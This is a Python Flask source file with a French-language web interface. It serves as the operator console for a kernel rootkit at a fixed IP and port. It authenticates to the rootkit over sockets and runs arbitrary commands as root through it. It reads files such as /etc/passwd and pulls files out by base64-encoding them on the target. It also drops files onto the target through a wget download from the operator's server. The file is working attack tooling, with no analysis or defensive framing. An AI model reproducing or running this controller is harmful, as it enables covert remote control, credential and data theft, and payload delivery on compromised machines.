#!/usr/bin/env python3

from flask import Flask, render_template, request, jsonify, send_from_directory, session, redirect
import socket
import os
import base64
import tempfile
import re
import hashlib
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = 'clef_secrete_rootkit_2024'
UPLOAD_FOLDER = '/tmp/flask_uploads'

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/')
def index():
    if not session.get('authenticated'):
        return auth_page()
    return main_interface()

def auth_page():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Authentification Rootkit</title>
        <style>
            body {
                font-family: 'Courier New', monospace;
                background-color: #000;
                color: #0f0;
                margin: 0;
                padding: 0;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .auth-container {
                background-color: #111;
                border: 2px solid #0f0;
                padding: 30px;
                border-radius: 10px;
                text-align: center;
                min-width: 400px;
            }
            .auth-title {
                color: #f00;
                font-size: 24px;
                margin-bottom: 20px;
                text-shadow: 0 0 10px #f00;
            }
            .auth-input {
                width: 100%;
                padding: 10px;
                background-color: #000;
                border: 1px solid #0f0;
                color: #0f0;
                font-family: 'Courier New', monospace;
                font-size: 16px;
                margin-bottom: 15px;
                box-sizing: border-box;
            }
            .auth-button {
                width: 100%;
                padding: 10px;
                background-color: #0f0;
                border: none;
                color: #000;
                font-family: 'Courier New', monospace;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
            }
            .error-message {
                color: #f00;
                margin-top: 10px;
                display: none;
            }
            .step {
                margin-bottom: 10px;
                color: #ff0;
                font-size: 14px;
            }
        </style>
    </head>
    <body>
        <div class="auth-container">
            <div class="auth-title">☠️ ROOTKIT ACCESS ☠️</div>
            <div class="step">Étape 1: Configuration de la connexion</div>
            
            <form id="auth-form">
                <input type="text" id="target-ip" class="auth-input" placeholder="Adresse IP cible" value="10.0.2.6" required>
                <input type="text" id="target-port" class="auth-input" placeholder="Port" value="8007" required>
                <input type="password" id="password" class="auth-input" placeholder="Mot de passe rootkit" required>
                <button type="submit" class="auth-button">CONNECTER ET AUTHENTIFIER</button>
            </form>
            
            <div id="error-msg" class="error-message">Erreur de connexion ou mot de passe incorrect !</div>
        </div>
        
        <script>
            document.getElementById('auth-form').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const ip = document.getElementById('target-ip').value;
                const port = document.getElementById('target-port').value;
                const password = document.getElementById('password').value;
                
                document.getElementById('error-msg').style.display = 'none';
                document.querySelector('.auth-button').textContent = 'CONNEXION EN COURS...';
                
                fetch('/authenticate', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        ip: ip,
                        port: port,
                        password: password
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        window.location.reload();
                    } else {
                        document.getElementById('error-msg').style.display = 'block';
                        document.getElementById('error-msg').textContent = data.error || 'Erreur de connexion ou mot de passe incorrect !';
                        document.querySelector('.auth-button').textContent = 'CONNECTER ET AUTHENTIFIER';
                        document.getElementById('password').value = '';
                    }
                })
                .catch(error => {
                    document.getElementById('error-msg').style.display = 'block';
                    document.getElementById('error-msg').textContent = 'Erreur de connexion !';
                    document.querySelector('.auth-button').textContent = 'CONNECTER ET AUTHENTIFIER';
                });
            });
            
            document.getElementById('target-ip').focus();
        </script>
    </body>
    </html>
    '''

def main_interface():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Console d'Administration</title>
        <style>
            body {
                font-family: 'Courier New', monospace;
                background-color: #000;
                color: #0f0;
                margin: 0;
                padding: 0;
                height: 100vh;
                display: flex;
                flex-direction: column;
            }
            
            .terminal-header {
                background-color: #333;
                color: #fff;
                padding: 5px 10px;
                font-weight: bold;
                display: flex;
                justify-content: space-between;
                border-bottom: 1px solid #555;
            }
            
            .terminal-body {
                flex-grow: 1;
                padding: 10px;
                overflow-y: auto;
                display: flex;
                flex-direction: column;
            }
            
            .config-panel {
                display: flex;
                margin-bottom: 10px;
            }
            
            .config-panel input {
                background-color: #222;
                color: #0f0;
                border: 1px solid #0f0;
                padding: 5px;
                margin-right: 10px;
                font-family: 'Courier New', monospace;
            }
            
            .terminal-output {
                background-color: #111;
                border: 1px solid #333;
                padding: 10px;
                flex-grow: 1;
                overflow-y: auto;
                white-space: pre-wrap;
                font-size: 14px;
                margin-bottom: 10px;
                height: 300px;
            }
            
            .prompt {
                display: flex;
                margin-bottom: 10px;
                align-items: center;
            }
            
            .prompt-symbol {
                color: #0f0;
                margin-right: 5px;
            }
            
            .command-input {
                flex-grow: 1;
                background-color: #000;
                color: #0f0;
                border: none;
                font-family: 'Courier New', monospace;
                padding: 5px;
                outline: none;
            }
            
            .button-row {
                display: flex;
                gap: 10px;
                flex-wrap: wrap;
                margin-bottom: 10px;
            }
            
            button {
                background-color: #333;
                color: #0f0;
                border: 1px solid #0f0;
                padding: 5px 10px;
                cursor: pointer;
                font-family: 'Courier New', monospace;
                transition: all 0.3s;
            }
            
            button:hover {
                background-color: #0f0;
                color: #000;
            }
            
            .upload-button {
                background-color: #006600 !important;
                font-weight: bold;
            }
            
            .status-info {
                display: flex;
                gap: 15px;
                margin-bottom: 10px;
                background-color: #111;
                padding: 5px 10px;
                border: 1px solid #333;
            }
            
            .status-item {
                display: flex;
                align-items: center;
            }
            
            .status-led {
                height: 10px;
                width: 10px;
                border-radius: 50%;
                margin-right: 5px;
            }
            
            .led-green {
                background-color: #0f0;
                box-shadow: 0 0 5px #0f0;
            }
            
            .led-red {
                background-color: #f00;
                box-shadow: 0 0 5px #f00;
            }
            
            .file-mode-active {
                color: #ff0;
            }
            
            .tab-bar {
                display: flex;
                margin-bottom: 10px;
            }
            
            .tab {
                padding: 5px 15px;
                background-color: #333;
                margin-right: 2px;
                cursor: pointer;
            }
            
            .tab.active {
                background-color: #555;
                border-top: 2px solid #0f0;
            }
            
            .upload-form {
                background-color: #111;
                border: 1px solid #333;
                padding: 10px;
                margin-bottom: 10px;
                display: none;
            }
            
            .upload-form input[type=file] {
                width: 0.1px;
                height: 0.1px;
                opacity: 0;
                overflow: hidden;
                position: absolute;
                z-index: -1;
            }
            
            .upload-form label {
                display: inline-block;
                background-color: #333;
                color: #0f0;
                border: 1px solid #0f0;
                padding: 5px 10px;
                cursor: pointer;
                font-family: 'Courier New', monospace;
                transition: all 0.3s;
                margin-right: 10px;
            }
            
            .upload-form label:hover {
                background-color: #0f0;
                color: #000;
            }
            
            .upload-filename {
                display: inline-block;
                margin-left: 10px;
                color: #ccc;
            }
            
            .hide-options {
                display: flex;
                flex-direction: column;
                margin-top: 10px;
                padding: 5px;
                background-color: #222;
                border: 1px solid #444;
                margin-bottom: 10px;
            }
            
            #hide-path {
                background-color: #222;
                color: #0f0;
                border: 1px solid #0f0;
                padding: 5px;
                margin-top: 5px;
                width: 100%;
                font-family: 'Courier New', monospace;
            }
        </style>
    </head>
    <body>
        <div class="terminal-header">
            <div>Console d'Administration Système - Session Root</div>
            <div id="time"></div>
        </div>
        
        <div class="terminal-body">
            <div class="tab-bar">
                <div class="tab active" onclick="changerMode('commande')">Mode Commande</div>
                <div class="tab" onclick="changerMode('fichier')">Mode Fichier</div>
                <div class="tab" onclick="changerMode('upload')">Mode Upload</div>
                <div class="tab" onclick="testFichiers()">Liste fichiers</div>
            </div>
            
            <div class="status-info">
                <div class="status-item">
                    <div class="status-led" id="connection-status"></div>
                    <span id="status-text">Déconnecté</span>
                </div>
                <div class="status-item">
                    <span id="machine-info">--</span>
                </div>
                <div class="status-item" id="mode-indicator">
                    Mode: <span class="file-mode-active">Commande</span>
                </div>
            </div>
            
            <div class="config-panel">
                <input type="text" id="ip" placeholder="Adresse IP" value="10.0.2.6">
                <input type="text" id="port" placeholder="Port" value="8007">
                <button onclick="testFunction()">Connecter</button>
            </div>
            
            <div class="terminal-output" id="resultat">Système prêt. En attente de connexion...</div>
            
            <div class="prompt" id="prompt-command">
                <div class="prompt-symbol" id="prompt-text">root@système:~#</div>
                <input type="text" id="commande" class="command-input" placeholder="" onkeydown="if(event.key === 'Enter') executerCommande()">
            </div>
            
            <div class="prompt" id="prompt-file" style="display: none;">
                <div class="prompt-symbol">cat</div>
                <input type="text" id="chemin" class="command-input" placeholder="/chemin/du/fichier" onkeydown="if(event.key === 'Enter') lireFichier()">
            </div>
            
            <div class="upload-form" id="upload-section">
                <form id="upload-form" enctype="multipart/form-data">
                    <label for="file-upload">Sélectionner un fichier</label>
                    <input id="file-upload" type="file" name="file">
                    <span class="upload-filename" id="file-selected">Aucun fichier sélectionné</span>
                    
                    <div class="hide-options">
                        <div><strong>Chemin de destination:</strong></div>
                        <input type="text" id="hide-path" placeholder="/tmp/monfichier.ext" value="/tmp/">
                    </div>
                    
                    <button type="button" onclick="uploadViaWget()" class="upload-button">Upload WGET</button>
                    <button type="button" onclick="downloadFile()" class="upload-button">Download Fichier</button>
                </form>
            </div>
            
            <div class="button-row">
                <button onclick="document.getElementById('commande').value='uname -a'; executerCommande()">uname -a</button>
                <button onclick="document.getElementById('commande').value='id'; executerCommande()">id</button>
                <button onclick="document.getElementById('commande').value='ps aux'; executerCommande()">ps aux</button>
                <button onclick="document.getElementById('commande').value='netstat -tuln'; executerCommande()">netstat -tuln</button>
                <button onclick="document.getElementById('commande').value='ls -la /root'; executerCommande()">ls -la /root</button>
                <button onclick="document.getElementById('commande').value='w'; executerCommande()">users</button>
                <button onclick="document.getElementById('chemin').value='/etc/passwd'; changerMode('fichier'); lireFichier()">passwd</button>
                <button onclick="testFichiers()">FICHIERS</button>
            </div>
        </div>
        
        <script>
            let modeActuel = 'commande';
            let connecte = false;
            let port8007Status = false;
            
            function updateClock() {
                const now = new Date();
                let timeText = now.toLocaleTimeString();
                
                if (port8007Status) {
                    timeText += " | Port 8007: <span style='color: #0f0;'>OUVERT</span>";
                } else {
                    timeText += " | Port 8007: <span style='color: #f00;'>FERMÉ</span>";
                }
                
                document.getElementById('time').innerHTML = timeText;
            }
            
            function verifierPort8007() {
                const ip = document.getElementById('ip').value;
                
                fetch('/api/verifier_port', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ip: ip, port: 8007})
                })
                .then(response => response.json())
                .then(data => {
                    port8007Status = data.ouvert;
                    updateClock();
                })
                .catch(error => {
                    port8007Status = false;
                    updateClock();
                });
            }
            
            setInterval(verifierPort8007, 5000);
            setTimeout(verifierPort8007, 1000);
            setInterval(updateClock, 1000);
            updateClock();
            
            document.getElementById('file-upload').addEventListener('change', function() {
                const fileName = this.files[0] ? this.files[0].name : 'Aucun fichier sélectionné';
                document.getElementById('file-selected').textContent = fileName;
                
                if (this.files[0]) {
                    const currentPath = document.getElementById('hide-path').value;
                    if (currentPath.endsWith('/')) {
                        document.getElementById('hide-path').value = currentPath + this.files[0].name;
                    }
                }
            });
            
            function changerMode(mode) {
                modeActuel = mode;
                
                document.getElementById('prompt-command').style.display = 'none';
                document.getElementById('prompt-file').style.display = 'none';
                document.getElementById('upload-section').style.display = 'none';
                
                document.querySelectorAll('.tab').forEach((tab, index) => {
                    if (index < 3) tab.classList.remove('active');
                });
                
                if (mode === 'commande') {
                    document.getElementById('prompt-command').style.display = 'flex';
                    document.getElementById('mode-indicator').innerHTML = 'Mode: <span class="file-mode-active">Commande</span>';
                    document.querySelectorAll('.tab')[0].classList.add('active');
                    document.getElementById('commande').focus();
                } else if (mode === 'fichier') {
                    document.getElementById('prompt-file').style.display = 'flex';
                    document.getElementById('mode-indicator').innerHTML = 'Mode: <span class="file-mode-active">Fichier</span>';
                    document.querySelectorAll('.tab')[1].classList.add('active');
                    document.getElementById('chemin').focus();
                } else if (mode === 'upload') {
                    document.getElementById('upload-section').style.display = 'block';
                    document.getElementById('mode-indicator').innerHTML = 'Mode: <span class="file-mode-active">Upload</span>';
                    document.querySelectorAll('.tab')[2].classList.add('active');
                }
            }
            
            function afficherResultat(texte) {
                const conteneur = document.getElementById('resultat');
                conteneur.textContent = texte;
                conteneur.scrollTop = conteneur.scrollHeight;
            }
            
            function testFunction() {
                const ip = document.getElementById('ip').value;
                const port = document.getElementById('port').value;
                
                document.getElementById('status-text').textContent = 'Tentative de connexion...';
                document.getElementById('connection-status').className = 'status-led';
                
                fetch('/api/executer', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ip: ip, port: port, commande: 'id'})
                })
                .then(response => response.json())
                .then(data => {
                    if (data.resultat.startsWith('Erreur')) {
                        document.getElementById('status-text').textContent = 'Déconnecté';
                        document.getElementById('connection-status').className = 'status-led led-red';
                        document.getElementById('machine-info').textContent = '--';
                        connecte = false;
                        afficherResultat(data.resultat);
                    } else {
                        document.getElementById('status-text').textContent = 'Connecté';
                        document.getElementById('connection-status').className = 'status-led led-green';
                        connecte = true;
                        
                        fetch('/api/executer', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ip: ip, port: port, commande: 'hostname'})
                        })
                        .then(response => response.json())
                        .then(hostData => {
                            const hostname = hostData.resultat.trim();
                            document.getElementById('machine-info').textContent = hostname;
                            document.getElementById('prompt-text').textContent = `root@${hostname}:~#`;
                            
                            afficherResultat(`Connexion établie à ${ip}:${port}\\nMachine: ${hostname}\\n${data.resultat}`);
                        });
                    }
                })
                .catch(error => {
                    document.getElementById('status-text').textContent = 'Erreur de connexion';
                    document.getElementById('connection-status').className = 'status-led led-red';
                    connecte = false;
                    afficherResultat('Erreur de connexion au serveur: ' + error);
                });
            }
            
            function executerCommande() {
                const ip = document.getElementById('ip').value;
                const port = document.getElementById('port').value;
                const commande = document.getElementById('commande').value;
                
                if (!commande) return;
                
                const historyEntry = `${document.getElementById('prompt-text').textContent} ${commande}\\n`;
                afficherResultat(historyEntry + 'Exécution en cours...');
                
                fetch('/api/executer', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ip: ip, port: port, commande: commande})
                })
                .then(response => response.json())
                .then(data => {
                    afficherResultat(historyEntry + data.resultat);
                    
                    if (!connecte && !data.resultat.startsWith('Erreur')) {
                        document.getElementById('status-text').textContent = 'Connecté';
                        document.getElementById('connection-status').className = 'status-led led-green';
                        connecte = true;
                    }
                })
                .catch(error => {
                    afficherResultat(historyEntry + "Erreur: " + error);
                });
                
                document.getElementById('commande').value = '';
            }
            
            function lireFichier() {
                const ip = document.getElementById('ip').value;
                const port = document.getElementById('port').value;
                const chemin = document.getElementById('chemin').value;
                
                if (!chemin) return;
                
                const historyEntry = `cat ${chemin}\\n`;
                afficherResultat(historyEntry + 'Lecture en cours...');
                
                fetch('/api/lire', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ip: ip, port: port, chemin: chemin})
                })
                .then(response => response.json())
                .then(data => {
                    afficherResultat(historyEntry + data.resultat);
                })
                .catch(error => {
                    afficherResultat(historyEntry + "Erreur: " + error);
                });
                
                document.getElementById('chemin').value = '';
            }
            
            function uploadViaWget() {
                const fileInput = document.getElementById('file-upload');
                
                if (!fileInput.files.length) {
                    afficherResultat("Erreur: Aucun fichier sélectionné");
                    return;
                }
                
                const file = fileInput.files[0];
                const reader = new FileReader();
                
                reader.onload = function(e) {
                    const fileData = e.target.result.split(',')[1];
                    const targetPath = document.getElementById('hide-path').value || `/tmp/${file.name}`;
                    
                    afficherResultat(`Upload via WGET: ${file.name} (${file.size} octets)\\nDestination: ${targetPath}\\n\\nEtape 1/2: Stockage sur serveur Flask...`);
                    
                    fetch('/api/store_file', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            filename: file.name,
                            filedata: fileData
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            afficherResultat(`Upload via WGET: ${file.name}\\nDestination: ${targetPath}\\n\\nEtape 1/2: Fichier stocké sur serveur\\nURL: ${data.download_url}\\n\\nEtape 2/2: Téléchargement via wget...`);
                            
                            const ip = document.getElementById('ip').value;
                            const port = document.getElementById('port').value || '8007';
                            
                            fetch('/api/wget_download', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    ip: ip,
                                    port: port,
                                    download_url: data.download_url,
                                    target_path: targetPath,
                                    method: 'wget'
                                })
                            })
                            .then(response => response.json())
                            .then(wgetData => {
                                afficherResultat(`Upload via WGET: ${file.name} vers ${targetPath}\\n\\n${wgetData.resultat}\\n\\nUpload terminé avec succès`);
                                
                                document.getElementById('file-upload').value = '';
                                document.getElementById('file-selected').textContent = 'Aucun fichier sélectionné';
                                document.getElementById('hide-path').value = '/tmp/';
                            })
                            .catch(error => {
                                afficherResultat(`Erreur wget: ${error}`);
                            });
                        } else {
                            afficherResultat(`Erreur stockage: ${data.error}`);
                        }
                    })
                    .catch(error => {
                        afficherResultat(`Erreur stockage fichier: ${error}`);
                    });
                };
                
                reader.readAsDataURL(file);
            }
            
            function downloadFile() {
                const filePath = prompt('Chemin du fichier à télécharger:', '/root/');
                if (!filePath) return;
                
                const ip = document.getElementById('ip').value;
                const port = document.getElementById('port').value || '8007';
                
                afficherResultat(`Download: ${filePath}\\nVérification et téléchargement...`);
                
                fetch('/api/download_file', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        ip: ip,
                        port: port,
                        file_path: filePath
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        const link = document.createElement('a');
                        link.href = data.download_url;
                        link.download = data.filename;
                        document.body.appendChild(link);
                        link.click();
                        document.body.removeChild(link);
                        
                        afficherResultat(`Download: ${filePath}\\n\\nFichier téléchargé avec succès: ${data.filename}\\nTaille: ${data.size} octets`);
                    } else {
                        afficherResultat(`Download: ${filePath}\\n\\nErreur: ${data.error}\\n\\nDébug: Vérifiez que le fichier existe et que vous avez les permissions.`);
                    }
                })
                .catch(error => {
                    afficherResultat(`Erreur download: ${error}\\n\\nConseil: Vérifiez la connexion et le chemin du fichier.`);
                });
            }
            
            function testFichiers() {
                const ip = document.getElementById('ip').value;
                const port = document.getElementById('port').value || '8007';
                
                fetch('/api/commande_rootkit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        ip: ip, 
                        port: port,
                        commande: 'FICHIERS'
                    })
                })
                .then(response => response.json())
                .then(data => {
                    afficherResultat(`Fichiers en mémoire rootkit:\\n${data.resultat}`);
                })
                .catch(error => {
                    afficherResultat(`Erreur: ${error}`);
                });
            }
            
            document.getElementById('commande').focus();
        </script>
    </body>
    </html>
    '''

@app.route('/api/verifier_port', methods=['POST'])
def verifier_port():
    data = request.json
    ip = data.get('ip')
    port = int(data.get('port', 8007))
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        resultat = s.connect_ex((ip, port))
        s.close()
        
        if resultat == 0:
            return jsonify({"ouvert": True})
        else:
            return jsonify({"ouvert": False})
    except Exception as e:
        return jsonify({"ouvert": False, "erreur": str(e)})

@app.route('/authenticate', methods=['POST'])
def authenticate():
    data = request.json
    ip = data.get('ip')
    port = int(data.get('port', 8007))
    password = data.get('password')
    
    # Tester l'authentification directement avec le kernel
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((ip, port))
        
        # Attendre AUTH_REQUIRED
        try:
            initial_response = s.recv(1024).decode()
            if initial_response == "AUTH_REQUIRED":
                # Envoyer le mot de passe saisi par l'utilisateur
                s.send(f"AUTH {password}".encode())
                
                # Recevoir la réponse
                auth_response = s.recv(1024).decode()
                s.close()
                
                if auth_response == "AUTH_OK":
                    session['authenticated'] = True
                    session['user_password'] = password
                    session['target_ip'] = ip
                    session['target_port'] = port
                    return jsonify({"success": True})
                else:
                    return jsonify({"success": False, "error": "Mot de passe incorrect"})
            else:
                s.close()
                return jsonify({"success": False, "error": "Le rootkit ne demande pas d'authentification"})
        except socket.timeout:
            s.close()
            return jsonify({"success": False, "error": "Timeout - pas de réponse du rootkit"})
            
    except ConnectionRefusedError:
        return jsonify({"success": False, "error": f"Connexion refusée sur {ip}:{port}"})
    except Exception as e:
        return jsonify({"success": False, "error": f"Erreur de connexion: {str(e)}"})

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/api/executer', methods=['POST'])
def executer():
    data = request.json
    ip = data.get('ip')
    port = int(data.get('port', 8007))
    commande = data.get('commande')
    
    resultat = envoyer_commande(ip, port, "EXEC " + commande)
    return jsonify({"resultat": resultat})

@app.route('/api/lire', methods=['POST'])
def lire():
    data = request.json
    ip = data.get('ip')
    port = int(data.get('port', 8007))
    chemin = data.get('chemin')
    
    resultat = envoyer_commande(ip, port, "LIRE " + chemin)
    return jsonify({"resultat": resultat})

@app.route('/api/store_file', methods=['POST'])
def store_file():
    data = request.json
    filename = data.get('filename')
    filedata = data.get('filedata')
    
    if not filename or not filedata:
        return jsonify({"error": "Nom de fichier et données requis"}), 400
    
    try:
        file_content = base64.b64decode(filedata)
        clean_filename = secure_filename(filename)
        if not clean_filename:
            clean_filename = "uploaded_file"
        
        file_path = os.path.join(UPLOAD_FOLDER, clean_filename)
        
        with open(file_path, 'wb') as f:
            f.write(file_content)
        
        download_url = f"http://{request.host}/download/{clean_filename}"
        
        return jsonify({
            "success": True,
            "filename": clean_filename,
            "size": len(file_content),
            "download_url": download_url,
            "file_path": file_path
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/download/<filename>')
def download_file_serve(filename):
    try:
        return send_from_directory(UPLOAD_FOLDER, filename)
    except Exception as e:
        return f"Erreur: {str(e)}", 404

@app.route('/api/download_file', methods=['POST'])
def download_file_from_target():
    data = request.json
    ip = data.get('ip')
    port = int(data.get('port', 8007))
    file_path = data.get('file_path')
    
    if not file_path:
        return jsonify({"error": "Chemin de fichier requis"}), 400
    
    try:
        check_cmd = f"ls -la '{file_path}'"
        check_result = envoyer_commande(ip, port, "EXEC " + check_cmd)
        
        if check_result.startswith('Erreur') or 'No such file' in check_result or 'cannot access' in check_result:
            check_cmd2 = f"[ -f '{file_path}' ] && echo 'EXISTS' || echo 'NOT_EXISTS'"
            check_result2 = envoyer_commande(ip, port, "EXEC " + check_cmd2)
            
            if 'NOT_EXISTS' in check_result2 or check_result2.startswith('Erreur'):
                return jsonify({"error": f"Fichier non trouvé: {file_path} - Debug: {check_result}"}), 404
        
        cmd = f"base64 '{file_path}' 2>/dev/null"
        resultat = envoyer_commande(ip, port, "EXEC " + cmd)
        
        if resultat.startswith('Erreur') or 'No such file' in resultat or 'cannot access' in resultat or 'command not found' in resultat:
            return jsonify({"error": f"Erreur lors de l'encodage: {resultat}"}), 500
        
        lines = resultat.split('\n')
        base64_content = ""
        
        for line in lines:
            line = line.strip()
            if 'Code de retour' in line or 'Erreur' in line or line == '' or 'vagrant@' in line:
                continue
            clean_line = re.sub(r'[^A-Za-z0-9+/=]', '', line)
            if clean_line:
                base64_content += clean_line
        
        if not base64_content:
            return jsonify({"error": f"Aucun contenu base64 valide trouvé. Sortie brute: {resultat}"}), 500
        
        if len(base64_content) % 4 != 0:
            padding = 4 - (len(base64_content) % 4)
            if padding != 4:
                base64_content += '=' * padding
        
        if not re.match(r'^[A-Za-z0-9+/=]+$', base64_content):
            return jsonify({"error": f"Format base64 invalide après nettoyage. Contenu: {base64_content[:100]}... Sortie originale: {resultat[:200]}"}), 500
        
        try:
            file_content = base64.b64decode(base64_content)
            filename = os.path.basename(file_path)
            
            if not filename:
                filename = "downloaded_file"
            
            safe_filename = secure_filename(filename)
            if not safe_filename:
                safe_filename = "downloaded_file"
                
            download_path = os.path.join(UPLOAD_FOLDER, f"download_{safe_filename}")
            
            with open(download_path, 'wb') as f:
                f.write(file_content)
            
            download_url = f"http://{request.host}/download/download_{safe_filename}"
            
            return jsonify({
                "success": True,
                "filename": f"download_{safe_filename}",
                "size": len(file_content),
                "download_url": download_url,
                "original_path": file_path
            })
            
        except Exception as e:
            return jsonify({"error": f"Erreur décodage base64: {str(e)} - Contenu reçu: {resultat[:200]}"}), 500
            
    except Exception as e:
        return jsonify({"error": f"Erreur téléchargement: {str(e)}"}), 500

@app.route('/api/wget_download', methods=['POST'])
def wget_download():
    data = request.json
    ip = data.get('ip')
    port = int(data.get('port', 8007))
    download_url = data.get('download_url')
    target_path = data.get('target_path', '/tmp/')
    method = data.get('method', 'wget')
    
    if not download_url:
        return jsonify({"resultat": "Erreur: URL requis"})
    
    try:
        if method == 'wget':
            cmd = f"wget -O '{target_path}' '{download_url}'"
        else:
            return jsonify({"resultat": "Erreur: Méthode non supportée"})
        
        resultat = envoyer_commande(ip, port, "EXEC " + cmd)
        
        return jsonify({"resultat": f"Commande exécutée: {cmd}\n\nRésultat:\n{resultat}"})
        
    except Exception as e:
        return jsonify({"resultat": f"Erreur: {str(e)}"})

@app.route('/api/commande_rootkit', methods=['POST'])
def commande_rootkit():
    data = request.json
    ip = data.get('ip')
    port = int(data.get('port', 8007))
    commande = data.get('commande')
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((ip, int(port)))
        
        s.send(commande.encode())
        
        reponse = b""
        chunk = s.recv(5000)
        while chunk:
            reponse += chunk
            try:
                s.settimeout(0.5)
                chunk = s.recv(5000)
            except socket.timeout:
                break
        
        s.close()
        return jsonify({"resultat": reponse.decode()})
    except Exception as e:
        return jsonify({"resultat": f"Erreur: {str(e)}"})

def envoyer_commande(ip, port, message):
    # Utiliser les paramètres de la session si pas fournis
    if not ip or not port:
        ip = session.get('target_ip', ip)
        port = session.get('target_port', port)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect((ip, int(port)))
        
        # Vérifier si une authentification est requise
        s.settimeout(5)
        try:
            initial_response = s.recv(1024).decode()
            if initial_response == "AUTH_REQUIRED":
                # Utiliser le mot de passe de la session
                password = session.get('user_password', '')
                s.send(f"AUTH {password}".encode())
                
                auth_response = s.recv(1024).decode()
                if auth_response != "AUTH_OK":
                    s.close()
                    return f"Erreur: Authentification échouée - {auth_response}"
        except socket.timeout:
            pass
        
        s.send(message.encode())
        
        reponse = b""
        consecutive_empty = 0
        
        while consecutive_empty < 3:
            try:
                s.settimeout(3)
                chunk = s.recv(16384)
                if chunk:
                    reponse += chunk
                    consecutive_empty = 0
                else:
                    consecutive_empty += 1
            except socket.timeout:
                consecutive_empty += 1
        
        s.close()
        return reponse.decode()
    except Exception as e:
        return f"Erreur: {str(e)}"

if __name__ == '__main__':
    print("Serveur Flask démarré")
    print(f"Dossier uploads: {UPLOAD_FOLDER}")
    print("Interface web: http://0.0.0.0:5000")
    print("Upload via wget disponible")
    app.run(host='0.0.0.0', port=5000, debug=True)
